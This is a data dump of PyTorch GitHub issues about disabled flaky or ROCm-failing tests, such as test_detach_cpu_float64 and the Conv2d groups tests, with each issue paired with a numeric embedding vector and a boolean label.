 -5.61872497e-04  3.06861728e-01 -1.27044857e-01  1.69161275e-01
  4.71727140e-02  1.75259829e-01 -4.21700418e-01 -2.46461332e-01
  2.76285131e-02  2.38547489e-01 -4.41686660e-01  9.07564163e-02
  5.39920256e-02  1.00891188e-01  1.23316944e-01  4.25337553e-02
  1.23044774e-01 -4.63046610e-01 -1.25304520e-01  4.32174206e-01
  4.90557045e-01 -1.07334731e-02  2.23220646e-01 -1.08202942e-01
 -8.47726762e-02  3.55339795e-01  3.52563322e-01  1.36303663e-01
 -5.85567299e-03 -3.69147137e-02 -2.47604594e-01  1.07966483e-01
  2.10617214e-01  1.02195134e-02 -6.23725075e-03 -1.31414920e-01
  1.30951345e-01 -1.80590749e-01 -1.08279109e-01  2.15229630e-01
 -1.96259797e-01  9.46915075e-02 -2.95852721e-01 -1.02964982e-01
  1.21325687e-01  2.80273985e-02 -2.31380135e-01 -4.33614522e-01
 -4.06816065e-01  3.24534863e-01 -1.95893534e-02  8.13537687e-02
  5.68437483e-03 -6.46778494e-02 -2.31112957e-01  6.33652955e-02
 -1.36503920e-01  1.50347725e-02 -5.20640463e-02  2.07786992e-01
 -9.38324034e-02 -1.27431035e-01 -6.53250590e-02 -3.15700352e-01
 -2.38248959e-01  7.57219493e-02 -1.35633856e-01 -1.16951704e-01
  1.85266100e-02 -2.05873773e-02 -9.62333903e-02 -4.10788268e-01
  5.02907574e-01  1.03855729e-01  1.40669450e-01 -6.61133900e-02
 -1.75465494e-01 -3.03794891e-01 -3.72563004e-02  9.98347774e-02
 -6.60912156e-01 -2.79701114e-01 -7.73327798e-02 -4.75363396e-02
 -1.63333684e-01  1.89376682e-01 -2.09999710e-01 -1.10259369e-01
 -3.36772442e-01  2.53123164e-01  2.70812400e-02 -2.60812163e-01
  1.43241629e-01  1.74337327e-01 -9.14738923e-02  1.39395609e-01
 -3.41615919e-03  1.14980057e-01  1.50059387e-01 -2.62210757e-01
  4.75716889e-02  2.42327526e-01  1.80260371e-03  5.62304735e-01
  1.43806458e-01  2.68399477e-01 -1.43493101e-01  2.88366795e-01
 -1.75728470e-01 -7.73290396e-02  1.13348842e-01 -2.81312168e-01
  1.85254827e-01 -1.27789706e-01  4.96592596e-02 -3.06134909e-01
  2.88360357e-01 -1.91936404e-01 -1.42196193e-01 -1.35846287e-01
  1.92002177e-01  1.61268130e-01 -2.04469875e-01  3.93794961e-02
  6.25684261e-02 -4.03909385e-01 -3.26819047e-02 -5.28116524e-02
 -1.27457455e-01  1.13827996e-02 -4.29724216e-01  4.90942374e-02
  9.32740569e-02  2.46736929e-02 -1.78948700e-01  1.01065397e-01
  2.98493445e-01 -4.05874625e-02  1.15140185e-01  2.06084028e-01
 -3.62297893e-02  6.46329150e-02  1.77783787e-01 -5.25491275e-02
 -1.97443336e-01 -4.89199273e-02  2.92824745e-01  1.05306476e-01
  5.98464549e-01 -1.35262385e-01  5.22308201e-02  3.36912483e-01
 -7.59052858e-02  4.95210886e-01  9.85717867e-03 -2.01556161e-02
 -1.90320924e-01  6.77089572e-01  1.01584703e-01  1.12419114e-01
 -1.13525540e-01 -5.14672399e-01 -1.10631391e-01 -1.03737041e-01
  9.56407115e-02  2.03332826e-01 -3.02931488e-01 -3.32730472e-01
 -2.39957929e-01  8.04357231e-02 -1.20784797e-01 -7.75653943e-02
 -1.27001405e-01 -4.96253371e-02 -2.18358457e-01 -9.62135717e-02
 -1.00433804e-01  3.35602403e-01  3.38021740e-02  6.32803068e-02
 -1.36919230e-01  7.84962997e-03 -8.83205608e-02 -2.13599771e-01
 -1.62854120e-01 -2.95862973e-01  1.78531602e-01  5.02289534e-01
  1.37753617e-02  1.20869786e-01  1.07160464e-01  1.26953572e-01
 -2.54417360e-01  2.03915387e-01  6.25181645e-02  6.98428303e-02
 -8.50410163e-02  9.04040858e-02  5.00892475e-02  3.11242133e-01
 -4.06259120e-01  1.93060309e-01 -3.09932768e-01  1.37566030e-01
  1.64858103e-01 -7.99336582e-02  6.37306273e-02 -2.19593868e-01
  3.45426798e-02  3.42810422e-01 -4.20295924e-01  3.06514531e-01
 -1.35356501e-01  2.64540970e-01  3.89764428e-01  3.21488231e-02
  1.91342175e-01  4.38051671e-02  1.50137097e-01 -1.05609283e-01
 -1.62781373e-01  7.38168359e-02 -1.20507464e-01 -4.70792428e-02]"
DISABLED test_detach_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_detach_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17842173875).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_detach_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.3778336   0.05094779 -0.22386514 -0.11834186 -0.04146429 -0.3716892
  0.03460061  0.15265352 -0.33068207 -0.13935648  0.32471693 -0.10107489
  0.31775722  0.11236213 -0.02857654 -0.09641746 -0.18410054 -0.08477992
  0.45747715  0.13017318 -0.2626988   0.07975725 -0.3569727   0.1896961
  0.17510006 -0.0216275  -0.15833156 -0.01410069  0.0774775   0.08672296
  0.22438203  0.11361282 -0.3269102   0.03353247  0.5366534   0.16796671
 -0.17947601 -0.12948337 -0.26032797 -0.12795931  0.24035545  0.03281416
  0.03890669 -0.19089495  0.24158596 -0.04115306 -0.1766642   0.22067846
 -0.20865752 -0.04576039  0.17592205 -0.06790354  0.02059015 -0.3417925
  0.00572523 -0.18749058  0.10565972  0.34260756  0.04328422  0.15013292
  0.12013349  0.07078625 -0.09265177 -0.10718395 -0.08905402  0.08416136
  0.25016287 -0.3248685   0.5438989  -0.13601586  0.12881556  0.01097982
 -0.31927037 -0.07394996  0.17536376  0.20871334 -0.2566225   0.06451258
 -0.09664958 -0.07183741 -0.06937017 -0.07866453  0.03060315  0.04017204
  0.22295037 -0.00989481  0.10634041 -0.04973515  0.24013963 -0.17276111
  0.18192953  0.26365873 -0.14326672 -0.0267667  -0.17594813 -0.04829068
  0.34170422 -0.13205984 -0.3520974   0.20126452  0.15410826 -0.44624096
 -0.20005     0.2669993  -0.09012514 -0.23791337  0.491697    0.00793906
  0.0712577  -0.215182    0.0926436   0.05652971  0.02165508  0.04763694
  0.10480809 -0.05291586 -0.17861739 -0.14241733 -0.04951873  0.47753838
 -0.24749139 -0.10402244  0.08396688 -0.02741414  0.35664082  0.05965915
 -0.08890872 -0.00345488  0.15814786  0.00431953  0.028355    0.12678544
 -0.267005   -0.12850863  0.13472196  0.09668133 -0.1683195  -0.25360847
  0.02888599  0.05275376 -0.14451142  0.04530966  0.04310769 -0.24781403
  0.22706956  0.09792498 -0.0916693   0.12618348 -0.12037864  0.05102348
  0.03953452  0.0501352   0.19820663  0.42152116 -0.07620072 -0.0250137
  0.37115592  0.15332767  0.10634559 -0.07255027 -0.08242546  0.4828337
 -0.03787898  0.03463394  0.30421358 -0.11978438 -0.44038913  0.06961547
 -0.01144418  0.18266904 -0.15879998 -0.05389495  0.20942873 -0.16425097
 -0.0645294  -0.0838646   0.3103861  -0.34535128 -0.01524097  0.2792826
 -0.03035189  0.04705107  0.12417534  0.10859548 -0.03936451  0.11976433
  0.19507942 -0.10152636  0.09049493 -0.0250424  -0.55223536 -0.25521997
  0.06501055 -0.0765868  -0.24968961 -0.28551328 -0.00479726 -0.06788315
  0.04410246 -0.03158676 -0.11598265  0.35265216  0.21597216 -0.07615652
  0.04939695  0.19585705 -0.1234687  -0.43508962  0.18210691  0.02602032
 -0.24782497 -0.04637681 -0.15464878 -0.3549297   0.01068458 -0.00780893
 -0.0126947  -0.0722027   0.03014685  0.27227777 -0.24238655 -0.21724364
 -0.19320208 -0.11349908 -0.3224398  -0.09226494 -0.27958575  0.25797397
 -0.03799896 -0.1027051  -0.06279525 -0.28009772  0.16444209 -0.04920585
  0.3733221  -0.25606883 -0.32602525 -0.06541535 -0.01126871  0.46099573
 -0.5063325  -0.5334922  -0.09323612  0.09024997 -0.02664683  0.02338937
  0.08074234 -0.06372559 -0.20141327  0.11839886 -0.11035711 -0.2872746
  0.27947372 -0.01030247  0.13527104  0.43103993 -0.1231856   0.10887933
 -0.02710198 -0.01253899 -0.01141316  0.39972648 -0.12914337  0.23868293
  0.16047001  0.10113847 -0.20502587  0.12078414  0.06022877 -0.18243119
  0.544366   -0.44864684  0.07535744  0.14884949  0.30813694 -0.2780581
  0.343588    0.14324352 -0.02111231 -0.11932414  0.19730936  0.09104432
 -0.06895144 -0.11556027  0.2094164  -0.26220793 -0.14241834 -0.08997254
 -0.2716301  -0.07683271 -0.11345781  0.16779923  0.03364914 -0.00073092
 -0.38119048 -0.07592491  0.33096415 -0.29678234  0.13138431 -0.10733609
 -0.17765713 -0.06163926  0.1723293  -0.36241335 -0.04521193 -0.08711549
  0.09073395  0.00896739  0.4185387  -0.39051515  0.07720686  0.17088957
 -0.10824485  0.27311006  0.0387518   0.03219098 -0.24170047  0.28792393
  0.10068877  0.1998827   0.29673493 -0.12987435 -0.37652147  0.12282449
  0.16182424  0.05829415 -0.3126518  -0.10809319 -0.04527514  0.01425072
 -0.0749944  -0.08799757 -0.15491997 -0.20361918 -0.01867477 -0.07163823
 -0.11262029  0.4224776   0.01023622 -0.22029802  0.10286938 -0.08785826
  0.08262148 -0.37144715 -0.1256994  -0.05633744  0.20655994  0.17691231
  0.20973982  0.08790498 -0.08473454  0.03431387 -0.25421935 -0.10497806
  0.15562132  0.50789785  0.08466026  0.04625088  0.34957266  0.48896402
 -0.21817565  0.05157219 -0.42442128 -0.3143111   0.16924767 -0.11822602
 -0.00751976  0.01273156  0.06955931  0.2936535  -0.48424244  0.17178103
 -0.09852767  0.35520938  0.16095136 -0.0527966   0.24724403 -0.22767983
  0.04973092  0.00596335 -0.12558869  0.17249995  0.11456829  0.13161504]"
DISABLED test_Conv2d_naive_groups_cuda_float16 (__main__.TestConvolutionNNDeviceTypeCUDA) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-8.57447833e-02 -8.00174624e-02 -3.11256170e-01 -7.88932592e-02
 -8.17890763e-02 -2.73944914e-01  2.42010921e-01  6.40645698e-02
 -4.61598039e-01 -8.52296278e-02  4.13532436e-01 -6.91081762e-01
  1.55938789e-01  1.12416875e-03 -5.19715369e-01 -3.65151390e-02
 -2.47266561e-01 -9.46284533e-02 -2.72384435e-02  2.27077454e-01
 -3.45884502e-01 -1.91381678e-01 -6.03129387e-01  1.69087052e-01
 -2.07841799e-01  4.18194860e-01 -2.71705866e-01 -1.33515611e-01
  1.04759231e-01  7.90879875e-02  8.60618874e-02  3.62323761e-01
  2.78207302e-01  1.40009612e-01  4.75738287e-01 -2.36224443e-01
 -3.00711274e-01 -2.14008808e-01 -4.45518680e-02 -2.61901140e-01
  1.55854791e-01 -1.00477368e-01  3.19501758e-02  3.31339687e-02
 -2.39467308e-01 -2.20766980e-02  8.81611034e-02  9.41054150e-02
 -7.94759169e-02 -1.53668344e-01  2.74590611e-01 -1.74135804e-01
 -1.01852335e-01 -3.87301564e-01 -1.81097403e-01  2.24790871e-02
  1.65505499e-01  4.64362726e-02  1.43437907e-01  3.50034177e-01
  1.75864562e-01 -6.78101778e-02 -7.59253204e-02 -1.11568920e-01
  2.43840992e-01  4.71081525e-01  1.06679551e-01 -3.21275026e-01
  4.99997914e-01  1.79879159e-01 -1.33365646e-01  1.21245764e-01
 -4.27060574e-03  1.69362664e-01  3.14755917e-01  2.85147756e-01
 -5.60117746e-03 -3.21457572e-02  1.43343300e-01 -1.98447064e-01
 -1.07893884e-01  1.31949186e-01 -1.87473625e-01 -2.50188679e-01
  1.47229314e-01 -5.65312862e-01  2.10673898e-01 -3.79634947e-02
  1.01792805e-01 -1.38559118e-01  1.56865239e-01  4.95985210e-01
 -2.17410866e-02  3.31221938e-01 -1.37881100e-01 -1.20255224e-01
 -2.46469885e-01 -9.83411819e-02 -3.01456332e-01  1.83471262e-01
  2.29184143e-02  2.72553682e-01 -1.12519741e-01  3.21451694e-01
 -6.80166602e-01 -9.18769464e-02  1.41244888e-01 -2.71034420e-01
 -4.69339937e-02  4.94104445e-01 -1.93316862e-03 -1.10243432e-01
 -8.05698484e-02 -2.85440087e-02 -3.28917243e-02  1.98550329e-01
 -9.54579711e-02 -2.12569803e-01 -2.02739507e-01  2.63247658e-02
 -2.88088679e-01 -5.02886772e-01  2.20844507e-01  2.36314852e-02
  3.39108109e-01 -9.12784114e-02 -2.63167143e-01  4.00808081e-02
 -1.49664909e-01  9.00039226e-02 -6.32105619e-02  8.95799994e-02
  8.63666236e-02 -1.34186089e-01 -1.97789744e-01  2.85005331e-01
 -6.18439466e-02 -1.59416795e-01  4.43000942e-02  9.59105939e-02
 -1.62055880e-01  2.33650744e-01 -7.75483772e-02  5.79539128e-03
  3.78408790e-01  1.16047952e-02 -3.88710499e-01 -1.34431422e-01
  9.51762274e-02  2.46156126e-01  2.54247427e-01 -1.93080351e-01
  9.50668454e-02  6.59658253e-01 -1.03940658e-01 -1.18464217e-01
  6.37579203e-01  4.86440696e-02 -3.14679854e-02 -2.37842381e-01
 -2.45632213e-02  1.59311742e-01  1.19145192e-01 -1.02193415e-01
  4.33078229e-01  3.91774848e-02 -1.60923257e-01  8.52204412e-02
  1.59657806e-01  5.27530193e-01  3.24972063e-01  1.30666971e-01
  3.66215199e-01  2.75295042e-02  2.86396861e-01 -5.20292044e-01
  1.52068958e-02 -2.02632248e-01  3.71638536e-02  2.45308559e-02
 -6.66719452e-02  1.15563869e-01  4.81600970e-01 -2.16878772e-01
 -2.68252373e-01  1.38735801e-01 -5.50260060e-02  1.25358373e-01
 -8.07756484e-02 -3.04175586e-01 -5.07660270e-01  1.79915905e-01
 -1.54388860e-01 -1.14220425e-01 -3.64261776e-01 -2.61939347e-01
  1.40063062e-01 -7.41625354e-02  1.92907631e-01 -9.73798111e-02
 -9.39156562e-02  1.73603341e-01 -2.40563735e-01 -3.88016731e-01
  1.25236318e-01  4.07125652e-02  1.79750249e-02 -2.46715635e-01
  1.22937709e-01  3.37351918e-01 -1.74989253e-01 -4.16751206e-01
 -2.56881714e-01 -2.87035733e-01  9.69803780e-02  1.37962565e-01
 -1.12045668e-02  9.31593999e-02 -4.46675271e-01  1.66407615e-01
  3.20344090e-01 -1.22410625e-01  1.32415980e-01 -2.11326748e-01
 -2.76139379e-01 -1.68320671e-01 -9.35544223e-02 -3.64404991e-02
 -2.28856448e-02 -7.99885988e-02  6.11777827e-02  2.35100150e-01
  1.39977589e-01 -1.53292909e-01  6.28021061e-02 -2.29391247e-01
 -2.15710029e-02 -2.40217730e-01 -3.23035792e-02 -1.27594471e-01
 -2.62777835e-01 -3.20698023e-01 -5.95149435e-02  8.69163591e-03
  4.06298697e-01  6.04902387e-01 -4.02601957e-01  1.36159524e-01
 -3.24228168e-01  7.34929815e-02  4.37392965e-02 -7.12134317e-02
  3.36267352e-01  2.19882473e-01 -2.44038045e-01  1.64509803e-01
  1.53526627e-02 -7.23697171e-02  2.77975686e-02 -1.32251561e-01
  2.31901973e-01  2.90347517e-01 -3.90362680e-01  6.18173361e-01
  2.92161047e-01  2.98883021e-01 -5.65805495e-01  1.40420794e-02
 -1.94882885e-01 -2.39832327e-02  2.81666785e-01 -3.78226399e-01
  3.68547648e-01 -5.21050915e-02  3.58117640e-01 -2.45111614e-01
  4.79584396e-01  2.94134077e-02 -1.03341222e-01  1.56096965e-01
  1.29816979e-01 -3.24578360e-02 -1.87353283e-01  8.18208307e-02
  2.48409852e-01 -2.98424959e-01 -2.20460564e-01 -5.02653420e-01
 -3.72815847e-01 -1.07192360e-01  1.06349781e-01  2.95562863e-01
  1.43938035e-01  8.32344368e-02 -2.38182634e-01 -2.77244508e-01
  7.10522383e-02  1.12854481e-01  2.31679618e-01 -1.64176181e-01
 -4.88405168e-01  8.57733190e-02  3.39492202e-01 -4.46035445e-01
 -3.25475633e-01 -8.77327845e-02  8.37213844e-02  4.07489419e-01
  3.53175640e-01 -1.28743127e-01  1.11857392e-01 -1.85502395e-01
  1.34734660e-01  2.83587575e-01  9.21481401e-02 -9.30274874e-02
 -2.48787850e-02  2.18071163e-01 -1.04436278e-01  1.01484939e-01
  3.36088389e-01 -2.07950860e-01 -1.79266378e-01  2.86387384e-01
  3.29119205e-01  2.81292230e-01 -4.76450473e-01 -1.01952001e-01
 -7.04568252e-02  8.61679763e-02  8.41561109e-02 -1.09924451e-01
 -1.72332734e-01  2.11744860e-01 -9.84197110e-02 -2.29084224e-01
 -2.46677130e-01  5.03875554e-01  2.21405298e-01 -4.39836442e-01
 -2.44263798e-01  3.19592386e-01  5.09382691e-04 -3.67537498e-01
 -9.08935219e-02  3.90749332e-03  5.22810340e-01  3.24872315e-01
 -2.66134709e-01  5.76010525e-01  1.11010447e-01  1.05726317e-01
  1.50144547e-01 -1.76047504e-01  1.21085428e-01  3.40610504e-01
  3.39482337e-01 -5.74479476e-02  1.33705273e-01  5.03534041e-02
  8.26367885e-02  2.30073527e-01 -3.45971048e-01 -3.17329541e-02
  1.24836713e-01 -1.83978543e-01 -4.14933935e-02 -3.33777890e-02
  4.02998090e-01 -1.39742028e-02 -4.85114157e-01  1.61834508e-01
 -6.58391789e-02 -1.37842417e-01  3.10415447e-01 -4.27892923e-01
  4.09108520e-01  5.78993782e-02  1.27873257e-01  3.59698683e-01
  2.78400242e-01 -3.81428123e-01 -2.38220945e-01 -8.26829225e-02]"
DISABLED test_Conv2d_groups_nobias_v2 (__main__.TestConvolutionNN) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-9.63715613e-02  9.86819416e-02 -2.00821638e-01 -7.72603452e-02
 -6.89423606e-02 -2.34497905e-01  2.13772744e-01 -1.16895325e-03
 -4.12159443e-01 -7.62225837e-02  3.78661990e-01 -6.19107068e-01
  1.46606982e-01  7.78606534e-02 -4.63798523e-01  2.58675925e-02
 -3.11074108e-01 -1.76521450e-01  8.08461010e-02  2.25651816e-01
 -3.47858429e-01 -2.59301484e-01 -6.01237774e-01  1.59900576e-01
 -2.96089858e-01  3.92453820e-01 -2.63192952e-01 -2.41222382e-02
 -6.49349019e-03  2.06739217e-01  1.55548990e-01  3.23032618e-01
  1.52337044e-01  6.76172078e-02  5.09822249e-01 -1.65855110e-01
 -2.25454539e-01 -1.87174171e-01 -6.95374012e-02 -2.27296159e-01
  2.42459595e-01 -4.24918085e-02  2.29563378e-03  7.88916871e-02
 -2.84824163e-01 -1.62958205e-02  1.86670631e-01  4.30582128e-02
 -7.17762411e-02 -2.33966678e-01  1.73407927e-01 -7.96172321e-02
 -2.72904992e-01 -4.14442480e-01 -8.00325722e-02  1.84003264e-02
  2.72340477e-01  9.53365415e-02  1.21052615e-01  2.77955651e-01
  1.76603898e-01 -2.60762312e-02 -9.04350653e-02 -1.12608477e-01
  2.71921515e-01  4.26213384e-01  1.28345445e-01 -3.45689565e-01
  4.38671589e-01  2.13021040e-01 -2.54721761e-01  1.67313367e-02
 -4.51052468e-03  2.21348405e-01  3.84332746e-01  3.15147638e-01
 -9.08024535e-02 -3.48068774e-02  1.91382617e-01 -2.74554074e-01
 -9.12586749e-02  4.84505072e-02 -1.78685606e-01 -2.08306476e-01
  2.04999566e-01 -5.30528188e-01  1.50511891e-01 -1.82880193e-01
  2.06961572e-01 -1.13354899e-01  1.89329684e-01  3.37260544e-01
  8.59092772e-02  2.30262414e-01 -1.08237877e-01 -6.59615844e-02
 -2.46706754e-01 -2.73628980e-02 -2.67753303e-01  2.72034824e-01
  1.49323359e-01  2.25905687e-01 -1.74592167e-01  1.87892497e-01
 -7.34854221e-01 -4.49050739e-02  1.58848390e-01 -2.19778165e-01
 -1.06856555e-01  4.47340786e-01 -6.91360086e-02  7.56522641e-05
 -1.39261857e-01 -7.59315565e-02  4.49789055e-02  3.12263727e-01
  4.42343298e-03 -1.81333825e-01 -1.82135403e-01  1.92824930e-01
 -3.22581410e-01 -5.01625836e-01  3.27706039e-01  9.16754268e-03
  2.74201542e-01 -2.56459340e-02 -2.60659814e-01  8.88981521e-02
 -2.03371290e-02  1.81967095e-02 -1.26393467e-01  1.49593666e-01
  1.01007208e-01 -1.12123661e-01 -1.91243097e-01  2.23535776e-01
  7.58007318e-02 -2.19120950e-01  1.68865234e-01  1.79161057e-01
 -1.50255248e-01  1.57025903e-01  2.01422125e-02  1.98283652e-03
  2.78802395e-01 -1.60306588e-01 -4.78908420e-01 -8.46377611e-02
 -2.50285864e-03  1.57528222e-01  3.30538988e-01 -4.51960638e-02
  1.50890499e-01  6.75281942e-01 -2.20846757e-02 -7.91186988e-02
  5.34168839e-01  3.67312059e-02 -2.10260972e-02 -1.12667263e-01
 -1.12945288e-01  1.07051142e-01 -1.98975671e-02 -7.04199970e-02
  4.04296577e-01 -3.09852175e-02 -2.87241578e-01 -2.83502005e-02
  1.00235105e-01  4.24884260e-01  3.13797355e-01  1.97180420e-01
  3.27169776e-01 -9.74579677e-02  2.34740615e-01 -5.20339191e-01
  1.98370516e-01 -1.43751785e-01 -1.33280437e-02  7.97389727e-03
 -5.29701337e-02  4.90777269e-02  4.02241021e-01 -2.58257806e-01
 -2.87381381e-01  1.91461965e-01 -1.16437249e-01  8.11540037e-02
  2.72513181e-02 -2.40437090e-01 -4.19056267e-01  2.47291461e-01
 -4.84514982e-02 -1.35822728e-01 -3.44718277e-01 -2.42621377e-01
  1.36104703e-01 -1.97715044e-01  1.57652885e-01 -1.19686097e-01
  6.55549392e-02  1.67644173e-01 -2.61823982e-01 -3.99907768e-01
  1.14362568e-01  1.27671555e-01  1.39002898e-03 -2.54451632e-01
  4.88923714e-02  3.05421501e-01 -5.39234094e-02 -4.38623726e-01
 -2.13716835e-01 -2.96730578e-01  1.19369343e-01  1.40605778e-01
 -3.76030430e-02  3.52475867e-02 -4.47391450e-01  1.72405928e-01
  2.40139022e-01 -9.39775705e-02 -4.18309420e-02 -1.98294029e-01
 -3.74245942e-01 -4.78617102e-02 -1.78823039e-01 -1.31724067e-02
 -1.00934461e-01 -8.70753378e-02  1.29061081e-02  1.60382599e-01
  2.41255254e-01 -1.60718217e-01  2.10623369e-01 -2.14215755e-01
 -3.54354307e-02 -2.05230355e-01 -2.27692928e-02 -1.57886535e-01
 -2.40756810e-01 -4.63457644e-01 -1.21366337e-01  7.89875537e-02
  2.92260677e-01  5.67575693e-01 -2.86893547e-01  1.32529110e-01
 -3.82141829e-01  1.36715189e-01 -1.83466375e-02 -5.65485917e-02
  3.21835518e-01  3.88937652e-01 -8.87070522e-02  2.79987097e-01
 -7.86579922e-02 -9.37467366e-02  3.98832336e-02 -1.30638406e-01
  2.09552944e-01  2.87775844e-01 -3.91215503e-01  5.62001944e-01
  4.47479755e-01  3.19178581e-01 -4.38684583e-01 -2.72577461e-02
 -1.54583991e-01 -1.35581885e-02  2.17259571e-01 -4.70568478e-01
  2.00073957e-01 -2.66987309e-02  4.16170359e-01 -2.41201580e-01
  3.79368305e-01  4.73571680e-02 -1.92945898e-01  2.84103870e-01
  4.82789055e-02  1.39206648e-01 -2.18700662e-01  1.62443519e-01
  2.85527468e-01 -2.16179639e-01 -2.33870611e-01 -5.63755929e-01
 -3.13929588e-01 -4.89401352e-03  1.66576743e-01  2.68038809e-01
  2.42171660e-01  1.86856806e-01 -2.47680336e-01 -2.15744615e-01
  8.74021053e-02  3.77590582e-02  2.33902141e-01 -5.80652580e-02
 -4.60019350e-01  8.86111632e-02  3.39531332e-01 -3.48532498e-01
 -3.33643764e-01 -2.65171621e-02 -3.51180956e-02  3.17609131e-01
  3.67325842e-01 -2.65424252e-01  1.72420796e-02 -6.06592521e-02
  2.64316231e-01  2.72075027e-01  9.51284766e-02 -8.67472291e-02
 -9.65356529e-02  2.37125337e-01 -5.75866997e-02  1.02314807e-01
  4.52856421e-01 -3.95481437e-02 -1.31257728e-01  3.10125113e-01
  2.65846908e-01  1.73930541e-01 -5.28778076e-01 -2.46136636e-01
 -6.92244098e-02  2.23660339e-02  8.27720463e-02 -1.39290050e-01
 -2.68833160e-01  3.02976936e-01 -1.39822438e-01 -2.23037571e-01
 -1.82595313e-01  6.02267385e-01  1.24835894e-01 -5.41618824e-01
 -1.95627451e-01  3.22148621e-01  1.30371422e-01 -2.78802335e-01
 -1.20297216e-01 -1.08786626e-02  4.21487421e-01  8.31591263e-02
 -2.82760441e-01  5.37131667e-01  4.70042340e-02  7.22218230e-02
  7.39520788e-02 -1.54169202e-01 -1.58758666e-02  3.72085690e-01
  2.13238001e-01 -1.24600314e-01  1.96245432e-01  1.16979770e-01
 -2.85068341e-03  9.08227712e-02 -3.72376859e-01  2.74973232e-02
  1.01330042e-01 -9.65013504e-02 -1.51965290e-01 -5.76322190e-02
  3.19497675e-01  6.00626394e-02 -3.91298711e-01  9.93118510e-02
 -1.75149083e-01 -2.39398643e-01  2.45248392e-01 -3.82949948e-01
  4.71503019e-01  5.56997806e-02  1.80592388e-02  2.09935784e-01
  1.71114802e-01 -2.82410234e-01 -2.65622199e-01 -3.62680703e-02]"
DISABLED test_Conv2d_groups_nobias (__main__.TestConvolutionNN) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-8.86238217e-02  1.23038478e-01 -1.56502217e-01 -1.02443889e-01
 -7.12295771e-02 -2.11058691e-01  2.41258889e-01 -2.21616626e-02
 -4.50412750e-01 -6.33243993e-02  3.96785557e-01 -6.23271465e-01
  1.62361041e-01  7.34691620e-02 -4.46028292e-01  6.59823231e-03
 -3.27924192e-01 -1.67926595e-01  2.38152817e-02  2.03043580e-01
 -3.62362981e-01 -2.57379502e-01 -5.98661661e-01  1.62090793e-01
 -2.84939855e-01  3.55750054e-01 -2.63018638e-01 -4.80785295e-02
 -1.30841369e-02  2.15719625e-01  1.61189973e-01  3.75399202e-01
  1.77118093e-01  5.47144972e-02  4.92871284e-01 -1.20676681e-01
 -2.12751105e-01 -1.98067665e-01 -5.36501892e-02 -2.01947480e-01
  1.95194185e-01 -2.78910920e-02  1.96189489e-02  7.28828162e-02
 -2.58149415e-01 -1.13795307e-02  1.78759441e-01  3.45224254e-02
 -9.71287638e-02 -2.04391956e-01  1.60332382e-01 -8.91867504e-02
 -2.41682634e-01 -4.08782214e-01 -6.48003668e-02  7.69185554e-03
  2.81186104e-01  1.38374656e-01  1.59999549e-01  2.62489438e-01
  1.16557762e-01 -6.70940243e-03 -1.03887066e-01 -9.14778039e-02
  2.78983951e-01  4.29345191e-01  1.25335589e-01 -3.22344720e-01
  4.26817298e-01  2.22686917e-01 -2.50449002e-01  1.82040967e-05
 -4.64846147e-04  2.42856055e-01  3.67087781e-01  3.19397420e-01
 -1.00301087e-01 -6.91115931e-02  1.98979735e-01 -2.60180712e-01
 -1.09316401e-01  8.06800649e-02 -1.77114546e-01 -2.21570626e-01
  2.22436696e-01 -5.51877797e-01  1.29502684e-01 -2.13298082e-01
  1.93983272e-01 -1.03769623e-01  1.70668408e-01  3.32508743e-01
  9.52167585e-02  2.29096606e-01 -9.84709337e-02 -6.23155013e-02
 -2.48264730e-01 -2.74918266e-02 -3.08085889e-01  2.61887819e-01
  1.77139163e-01  2.48555318e-01 -1.74034536e-01  1.98200092e-01
 -7.38358974e-01 -6.80298209e-02  1.60106063e-01 -2.12244898e-01
 -7.47971460e-02  4.57594782e-01 -7.73265213e-02 -1.11924671e-02
 -1.71612263e-01 -9.72620398e-02  3.14701013e-02  2.99876690e-01
  4.84126918e-02 -1.80024296e-01 -1.20931320e-01  1.98632568e-01
 -3.12765598e-01 -5.02779901e-01  2.85387754e-01 -2.13624351e-03
  2.30872422e-01 -7.71559589e-03 -2.74773538e-01  8.59449208e-02
 -2.69488152e-02  3.64124030e-02 -1.12622395e-01  1.42651215e-01
  8.06593299e-02 -1.24724820e-01 -1.93847597e-01  2.16396734e-01
  7.09100813e-02 -2.02486336e-01  1.57245621e-01  2.01363832e-01
 -1.79968596e-01  1.59754664e-01  2.97916494e-02 -1.00590251e-02
  2.98528850e-01 -1.85281396e-01 -4.72776502e-01 -9.99234319e-02
 -7.45847635e-03  1.44587308e-01  3.22871834e-01 -9.15895477e-02
  1.31892398e-01  6.53998673e-01  1.30005870e-02 -8.82775038e-02
  5.79331040e-01  6.60191774e-02 -1.10593727e-02 -1.19360097e-01
 -8.50091577e-02  1.21147290e-01 -4.61574495e-02 -8.03705603e-02
  3.95417333e-01 -3.31724286e-02 -2.84775198e-01 -4.68392484e-03
